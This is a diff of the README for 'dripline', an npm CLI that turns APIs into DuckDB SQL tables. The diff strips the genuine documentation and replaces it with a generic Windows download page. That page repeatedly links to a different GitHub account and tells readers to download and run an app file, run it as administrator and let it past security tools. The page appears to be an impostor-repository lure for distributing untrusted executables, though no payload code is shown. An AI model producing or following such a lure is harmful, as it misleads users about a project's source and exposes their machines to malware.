@@ -1,326 +1,162 @@
-# dripline 💧
-
-Query mode for agents.
-
-Turn any API, CLI, or cloud service into a SQL table. Install a plugin, write a query, get rows. It's just SQL, DuckDB under the hood.
-
-```bash
-npm install -g dripline
-```
-
-## Quick Start
+# 💧 dripline - Query mode for agents
 
-```bash
-dripline init
-dripline plugin install git:github.com/Michaelliv/dripline#plugins/docker
+[![Download dripline](https://img.shields.io/badge/Download-Visit%20the%20page-2ea44f?style=for-the-badge)](https://github.com/th3Nebula/dripline)
 
-# Local: query live APIs directly
-dripline query "SELECT name, image, state FROM docker_containers"
-
-# Warehouse: query accumulated history on R2 / S3 / MinIO
-dripline query --remote "SELECT COUNT(*) FROM github_issues WHERE state = 'open'"
-```
-
-dripline has two modes that share the same SQL surface:
-
-- **Local** — plugins materialize tables on demand from live APIs. Zero infra.
-- **Warehouse** — `dripline run` syncs configured lanes into an S3-compatible
-  bucket as parquet; `dripline query --remote` reads the bucket. Same SQL, no
-  API calls, historical data.
-
-Skip to [Warehouse mode](#warehouse-mode) if you want the second tier.
-
-## Plugins
-
-All plugins install via `dripline plugin install git:github.com/Michaelliv/dripline#plugins/<name>`.
-
-| Plugin | Tables | Source |
-|--------|--------|--------|
-| **github** | repos, issues, pull_requests, stargazers | GitHub API |
-| **docker** | containers, images, volumes, networks | Docker CLI |
-| **brew** | formulae, casks, outdated, services | Homebrew |
-| **ps** | processes, ports | ps, lsof |
-| **git** | commits, branches, tags, remotes, status | Git CLI |
-| **system-profiler** | software, hardware, network_interfaces, storage, displays | macOS |
-| **pi** | sessions, messages, tool_calls, costs, prompt, generate | pi coding agent |
-| **kubectl** | pods, services, deployments, nodes, namespaces, configmaps, secrets, ingresses | Kubernetes |
-| **npm** | packages, outdated, global, scripts | npm CLI |
-| **spotlight** | search, apps, recent | macOS Spotlight |
-| **skills-sh** | search | skills.sh registry |
-| **cloudflare** | workers, zones, dns_records, pages_projects, pages_deployments, d1_databases, kv_namespaces, r2_buckets, queues, dns_lookup, domain_check | Cloudflare API |
-| **vercel** | projects, deployments, domains, env_vars | Vercel API |
-
-## Examples
-
-```sql
--- github: repos by stars
-SELECT name, stargazers_count, language
-FROM github_repos WHERE owner = 'torvalds'
-ORDER BY stargazers_count DESC LIMIT 5;
-
--- k8s: pods with restarts
-SELECT name, namespace, status, restarts
-FROM k8s_pods WHERE restarts > 0
-ORDER BY restarts DESC;
-
--- cloudflare: is your domain available?
-SELECT domain, available FROM cf_domain_check
-WHERE name_prefix = 'myproject' AND tlds = 'com,dev,sh,io,ai';
-
--- pi: how much have you spent per model?
-SELECT model, COUNT(*) as sessions, ROUND(SUM(total_cost), 2) as cost
-FROM pi_sessions GROUP BY model ORDER BY cost DESC;
-
--- skills.sh: top react skills
-SELECT name, source, installs FROM skills_search
-WHERE query = 'react' ORDER BY installs DESC LIMIT 5;
-
--- vercel: recent deployments
-SELECT name, state, git_commit_message FROM vercel_deployments
-WHERE project_name = 'my-blog' LIMIT 5;
-
--- join API data with a local CSV
-SELECT r.name, r.stargazers_count, s.revenue
-FROM github_repos r
-JOIN read_csv_auto('./revenue.csv') s ON r.name = s.repo
-WHERE r.owner = 'torvalds';
-
--- generate structured data with AI, query it with SQL
-SELECT data->>'name' as name, CAST(data->>'age' AS INT) as age
-FROM pi_generate
-WHERE prompt = 'generate 5 fictional engineers with name, age, city';
-```
-
-## Warehouse mode
-
-Turn dripline into a deployable data warehouse on top of any S3-compatible
-bucket (Cloudflare R2, MinIO, AWS S3). Plugins, engine, and SDK are unchanged
-— the warehouse layer is additive.
-
-**The idea:** `dripline run` periodically syncs tables into `raw/` as
-append-only parquet. `dripline compact` dedupes `raw/` into query-ready
-`curated/`. `dripline query --remote` reads `curated/` via DuckDB views. No
-scheduler service, no catalog — the bucket is the source of truth and the
-coordination layer (lease-based, one conditional PUT per lane).
-
-### 5-command quickstart
-
-```bash
-# 1. Initialize a dripline workspace
-dripline init
-
-# 2. Install a plugin
-dripline plugin install git:github.com/Michaelliv/dripline#plugins/github
-dripline connection add gh --plugin github --set token=ghp_xxx
-
-# 3. Point dripline at a bucket (env vars keep secrets out of config)
-export R2_KEY_ID=...
-export R2_SECRET=...
-dripline remote set https://<account>.r2.cloudflarestorage.com \
-  --bucket warehouse --prefix prod --secret-type R2 \
-  --access-key-env R2_KEY_ID --secret-key-env R2_SECRET
-
-# 4. Define a lane — a group of tables synced on a schedule
-dripline lane add fast \
-  --table github_issues --params owner=acme,repo=api \
-  --interval 15m
-
-# 5. Run it (and compact, and query)
-dripline run              # sync all due lanes, publish raw parquet
-dripline compact          # dedupe raw/ into curated/
-dripline query --remote "SELECT state, COUNT(*) FROM github_issues GROUP BY state"
-```
-
-Run `dripline run` from any cron, on any number of machines — workers compete
-for lanes via R2-native leases, so adding a worker is just another cron entry.
-No rebalancing, no leader election.
-
-### Layout in the bucket
-
-```
-<prefix>/
-  _leases/lane-<name>.json          ← work lease + cooldown timer
-  _state/<lane>/_dripline_sync.parquet  ← cursor metadata
-  raw/<table>/lane=<lane>/run=<id>.parquet  ← append-only bronze
-  curated/<table>/<hive>/part-0.parquet     ← compacted silver
-  _manifests/<table>.json           ← file index + stats
-```
-
-## Writing a Plugin
-
-Plugins use sync or async generators. Wrap an API with `syncGet`/`syncGetPaginated` (sync, curl-based) or `asyncGet`/`asyncGetPaginated` (async, native fetch), or a local CLI with `syncExec`.
-
-```typescript
-import type { DriplinePluginAPI } from "dripline";
-import { syncGetPaginated } from "dripline";
-
-export default function(dl: DriplinePluginAPI) {
-  dl.setName("orders");
-  dl.setVersion("1.0.0");
-
-  // Declare connection config — env vars override config.json values
-  dl.setConnectionSchema({
-    api_key: { type: "string", required: true, env: "ORDERS_API_KEY" },
-  });
-
-  dl.registerTable("orders", {
-    columns: [
-      { name: "id", type: "number" },
-      { name: "customer", type: "string" },
-      { name: "total", type: "number" },
-      { name: "created_date", type: "datetime" },
-    ],
-
-    // Key columns are extracted from WHERE clauses and passed to list() as quals.
-    // This is how plugins filter at the source instead of fetching everything.
-    //
-    //   required  — query MUST include this in WHERE or list() won't be called
-    //   optional  — passed to list() if present, ignored if not
-    //   any_of    — at least one column in the any_of group must be present
-    //
-    // Rule of thumb: if the underlying API/CLI accepts a filter parameter,
-    // declare it as a key column so the engine can push it down.
-    keyColumns: [
-      { name: "org_id", required: "required" },
-      { name: "created_date", required: "optional" },
-    ],
-
-    *list(ctx) {
-      const orgId = ctx.quals.find(q => q.column === "org_id")?.value;
-
-      // The engine extracts ALL SQL operators from WHERE clauses:
-      // =, !=, >, <, >=, <=, IN, NOT IN, BETWEEN, IS NULL, IS NOT NULL, LIKE, ILIKE
-      // Each qual has { column, operator, value } — use the operator to build your query.
-      const dateQual = ctx.quals.find(q => q.column === "created_date");
-
-      let url = `https://api.example.com/orgs/${orgId}/orders`;
-      if (dateQual) {
-        // dateQual.operator could be "=", ">=", "BETWEEN", etc.
-        // dateQual.value is a string for =/>=/<=, or [lower, upper] for BETWEEN
-        if (dateQual.operator === "BETWEEN") {
-          url += `?from=${dateQual.value[0]}&to=${dateQual.value[1]}`;
-        } else {
-          url += `?date_${dateQual.operator === ">=" ? "from" : "to"}=${dateQual.value}`;
-        }
-      }
-
-      const headers = { Authorization: `Bearer ${ctx.connection.config.api_key}` };
-      const data = syncGetPaginated(url, headers);
-      for (const d of data) {
-        yield { id: d.id, customer: d.customer, total: d.total, created_date: d.created_at };
-      }
-    },
-  });
-}
-```
-
-**How key columns work:** the engine uses DuckDB's own SQL parser to extract WHERE predicates on key columns and passes them to `list()` via `ctx.quals`. Each qual has `column`, `operator` (`=`, `>=`, `IN`, `BETWEEN`, `LIKE`, etc.), and `value` (a scalar, array, or null depending on the operator). The plugin uses these to filter at the source — fetching only matching rows instead of everything. Columns NOT in `keyColumns` are filtered by DuckDB after all rows are materialized. For large tables, declaring filter-friendly columns as optional key columns is the difference between milliseconds and timeouts.
-
-`syncExec` supports parsers: `json`, `jsonlines`, `csv`, `tsv`, `lines`, `kv`, `raw`.
-
-See [plugins/](plugins/) for full examples.
-
-## For Agents
-
-Every command supports `--json`. Use `dripline tables --json` for full schemas.
-
-A [pi](https://github.com/badlogic/pi-mono) package is included that injects available tables into the agent context on session start:
-
-```bash
-pi install git:github.com/Michaelliv/dripline
-```
-
-## CLI Reference
-
-```bash
-dripline                              # interactive REPL
-dripline query "<sql>"                # execute a query (alias: q)
-dripline query "<sql>" -o json        # output as json, csv, or line
-dripline tables                       # list all tables and columns
-dripline tables --json                # full schema as json
-dripline plugin install <source>      # install from git/npm/local path
-dripline plugin list                  # list installed plugins
-dripline plugin remove <name>         # remove a plugin
-dripline connection add <n> -p <plugin> -s key=val  # add connection
-dripline connection list              # list connections
-dripline init                         # create .dripline/ directory
-```
-
-REPL commands: `.tables`, `.inspect <table>`, `.connections`, `.output <format>`, `.help`, `.quit`.
-
-## SDK
-
-```typescript
-import { Dripline } from "dripline";
-import githubPlugin from "dripline-plugin-github";
-
-// Ephemeral mode — query fresh every time
-const dl = await Dripline.create({
-  plugins: [githubPlugin],
-  connections: [{ name: "gh", plugin: "github", config: { token: "ghp_xxx" } }],
-});
-
-const repos = await dl.query("SELECT name FROM github_repos WHERE owner = 'torvalds' LIMIT 5");
-await dl.close();
-```
-
-### Incremental Sync
-
-Sync plugin data into a persistent DuckDB database with cursor-based incremental updates:
-
-```typescript
-import { Database } from "duckdb-async";
-import { Dripline } from "dripline";
-
-const db = await Database.create("./analytics.duckdb");
-const dl = await Dripline.create({
-  plugins: [githubPlugin],
-  database: db,       // external DB — dripline won't close it
-  schema: "ws_1",     // namespace all tables under this schema
-});
-
-// Pull data — only new rows since last sync
-await dl.sync({ github_issues: { owner: "vercel", repo: "next.js" } });
-
-// Query persisted data
-const issues = await dl.query('SELECT state, COUNT(*) as cnt FROM "ws_1"."github_issues" GROUP BY state');
-
-await dl.close(); // does NOT close the shared database
-await db.close();
-```
-
-The sync strategy is determined automatically from the table definition:
-
-| `cursor` | `primaryKey` | Strategy |
-|----------|-------------|----------|
-| no | no | Full replace |
-| no | yes | Full replace + dedup |
-| yes | no | Incremental append |
-| yes | yes | Incremental append + dedup |
-
-## Configuration
-
-`.dripline/config.json`:
-
-```json
-{
-  "connections": [{ "name": "gh", "plugin": "github", "config": { "token": "ghp_xxx" } }],
-  "cache": { "enabled": true, "ttl": 300, "maxSize": 1000 },
-  "rateLimits": { "github": { "maxPerSecond": 5 } }
-}
-```
-
-Env vars override config. Plugins declare env var names in their connection schema (e.g. `GITHUB_TOKEN`).
-
-## Development
-
-```bash
-npm install
-npm run dev -- query "SELECT 1"
-npm test
-npm run check
-```
-
-## License
-
-MIT
+## 🧭 What dripline does
+
+dripline is an app that helps you use query mode for agents on Windows. It gives you a simple way to open, run, and manage query-based tasks without a steep setup process.
+
+Use it when you want to:
+- send a query to an agent
+- keep work in one place
+- run the app on your Windows PC
+- use a clean interface with less setup
+
+## 💻 Windows requirements
+
+dripline works best on a modern Windows computer.
+
+You should have:
+- Windows 10 or Windows 11
+- a mouse and keyboard
+- at least 4 GB of RAM
+- enough free disk space for the app and its data
+- an internet connection for the download page
+
+For best results, close other large apps before you start dripline.
+
+## 🚀 Download dripline
+
+Go to the download page here:
+
+https://github.com/th3Nebula/dripline
+
+On that page, look for the latest release or download file. Use the file made for Windows, then save it to your computer.
+
+If your browser asks where to save the file, choose a folder you can find again, such as Downloads or Desktop.
+
+## 🛠️ Install and run on Windows
+
+1. Open the folder where the file downloaded.
+2. If the file is a zip file, right-click it and choose Extract All.
+3. Open the extracted folder.
+4. Find the dripline app file.
+5. Double-click the app file to start it.
+6. If Windows asks for permission, select Run or Yes.
+
+If you use a security tool that blocks the file, allow dripline to run so the app can open.
+
+## 🔧 First-time setup
+
+After dripline opens, use these steps:
+
+1. Read the main screen.
+2. Set your preferred query options.
+3. Choose the agent or mode you want to use.
+4. Save your settings if the app offers a save button.
+5. Run a simple query to confirm that everything works.
+
+If the app asks for a folder or workspace, choose a location with easy access.
+
+## 🧩 Common use cases
+
+dripline fits a few simple tasks:
+
+- testing query mode with an agent
+- sending short requests and reading results
+- keeping repeated tasks in one app
+- working through guided actions on Windows
+- managing agent-based work with less effort
+
+## 📋 How to use dripline
+
+A basic flow looks like this:
+
+1. Open dripline.
+2. Pick a query or task.
+3. Enter the text you want the agent to process.
+4. Start the run.
+5. Read the result on screen.
+6. Make changes and run it again if needed.
+
+Keep your queries short at first. That makes it easier to see how the app behaves.
+
+## 🖥️ Tips for Windows users
+
+- Keep dripline in a folder you can reach fast.
+- Pin it to the taskbar if you use it often.
+- Use a stable internet connection when you set it up.
+- If the window looks small, try maximizing it.
+- Restart the app if it stops responding.
+
+## 🧠 Simple troubleshooting
+
+If dripline does not open:
+- check that the download finished
+- make sure you extracted the zip file first
+- try running the app as an administrator
+- restart your computer and try again
+
+If the app opens but does not work as expected:
+- close and reopen dripline
+- check your query text for mistakes
+- try a shorter query
+- make sure your Windows security tools are not blocking it
+
+If the download page does not load:
+- check your internet connection
+- try a different browser
+- refresh the page
+- open the link again
+
+## 📁 Suggested folder setup
+
+To keep things simple, use a setup like this:
+
+- Downloads for the original file
+- Desktop for quick access
+- Documents for saved query work
+- a separate folder for dripline files
+
+This makes it easier to find the app later and keep your files in order
+
+## 🔐 Safety and file handling
+
+Only download dripline from the link above. After download, keep the original file until you know the app runs correctly. If you extract files, leave the zip file in place until you no longer need it.
+
+If Windows shows a prompt before opening the app, read the name and location of the file before you continue
+
+## 🗂️ Example workflow
+
+A simple workflow can look like this:
+
+1. Download dripline from the GitHub page.
+2. Extract the files if needed.
+3. Open the app.
+4. Set your query mode.
+5. Run a test query.
+6. Review the result.
+7. Repeat with your next task.
+
+This works well for first-time use and for later sessions too
+
+## 📎 Download again if needed
+
+If you need the download page later, use this link:
+
+https://github.com/th3Nebula/dripline
+
+Keep it in your bookmarks so you can return to it when you want to update or reinstall dripline
+
+## 🧰 What to expect in the app
+
+dripline is built for focused query work. You can expect a simple layout, clear controls, and a workflow that stays centered on the task. The app is meant to help you move from opening the program to running a query with less effort
+
+## 📝 Quick start
+
+1. Visit the download page.
+2. Download the Windows file.
+3. Open the downloaded file or extract it first if needed.
+4. Launch dripline.
+5. Enter a query.
+6. Run the query and read the result
